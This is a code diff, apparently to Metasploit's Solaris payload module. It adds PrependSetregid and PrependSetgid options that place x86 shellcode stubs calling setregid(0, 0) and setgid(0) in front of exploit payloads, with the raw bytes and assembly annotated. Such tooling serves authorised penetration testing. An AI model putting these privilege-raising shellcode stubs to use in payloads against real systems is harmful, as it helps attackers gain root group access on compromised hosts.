@@ -33,6 +33,20 @@ module Msf::Payload::Solaris
 						"false"
 					]
 				),
+				Msf::OptBool.new('PrependSetregid',
+					[
+						false,
+						"Prepend a stub that executes the setregid(0, 0) system call",
+						"false"
+					]
+				),
+				Msf::OptBool.new('PrependSetgid',
+					[
+						false,
+						"Prepend a stub that executes the setgid(0) system call",
+						"false"
+					]
+				),
 				Msf::OptBool.new('AppendExit',
 					[
 						false,
@@ -86,6 +100,22 @@ module Msf::Payload::Solaris
 				       "\xff\xd6"              #   call    *%esi                      #
 			end
 
+			if (datastore['PrependSetregid'])
+				# setregid(0, 0)
+				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\xb0\xcb"             +#   movb    $0xcb,%al                  #
+				       "\xff\xd6"              #   call    *%esi                      #
+			end
+
+			if (datastore['PrependSetgid'])
+				# setgid(0)
+				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
+				       "\x50"                 +#   pushl   %eax                       #
+				       "\xb0\x2e"             +#   movb    $0x2e,%al                  #
+				       "\xff\xd6"              #   call    *%esi                      #
+			end
 			# Append
 
 			if (datastore['AppendExit'])
